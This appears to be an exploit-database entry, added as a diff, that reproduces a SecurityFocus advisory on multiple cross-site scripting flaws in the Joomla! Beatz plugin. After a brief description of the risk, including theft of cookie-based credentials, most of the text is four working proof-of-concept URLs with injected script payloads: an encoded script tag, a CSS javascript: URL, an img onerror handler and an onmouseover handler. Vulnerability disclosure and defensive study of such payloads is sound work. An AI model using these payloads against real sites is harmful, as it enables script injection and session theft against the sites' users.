@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/53030/info
+
+Joomla! Beatz Plugin is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker could leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This could allow the attacker to steal cookie-based authentication credentials and launch other attacks. 
+
+http://www.example.com/beatz/?option=com_content&view=frontpage&limitstart=5&%2522%253e%253c%2573%2563%2572%2569%2570%2574%253e%2561%256c%2565%2572%2574%2528%2f%2558%2553%2553%2f%2529%253c%2f%2573%2563%2572%2569%2570%2574%253e=1
+
+http://www.example.com/beatz/index.php?option=com_charts&view=charts&Itemid=76&chartkeyword=Acoustic&do=all%22%20style%3dbackground-image:url('javascript:alert(/XSS/)');width:1000px;height:1000px;display:block;"%20x=%22&option=com_charts
+
+http://www.example.com/beatz/index.php?do=listAll&keyword=++Search";><img+src=0+onerror=prompt(/XSS/)>&option=com_find
+
+http://www.example.com/beatz/index.php?option=com_videos&view=videos&Itemid=59&video_keyword="+style="width:1000px;height:1000px;position:absolute;left:0;top:0"+onmouseover="alert(/xss/)&search=Search 
